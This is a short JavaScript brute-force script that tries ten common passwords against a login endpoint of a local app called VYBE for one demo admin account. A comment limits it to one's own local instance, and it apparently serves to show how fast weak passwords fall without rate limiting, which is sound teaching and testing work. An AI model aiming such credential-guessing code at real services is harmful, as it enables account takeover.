// A brute-force script: try many passwords for one email, as fast as possible.
// Only ever run this against your own local VYBE.
const target = "admin1.demo@vybe.com";
const passwords = ["123456", "password", "qwerty", "abc123", "vybe123",
    "admin123", "letmein", "welcome1", "monkey", "sunshine1"];

const attack = async () => {
    const start = Date.now();
    for (const password of passwords) {
        const res = await fetch("http://localhost:3001/api/auth/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ email: target, password }),
        });
        console.log(res.status, password);
        if (res.status === 200) {
            console.log(`Found the password in ${Date.now() - start} ms: ${password}`);
            return;
        }
    }
    console.log("Password not found");
};

attack();
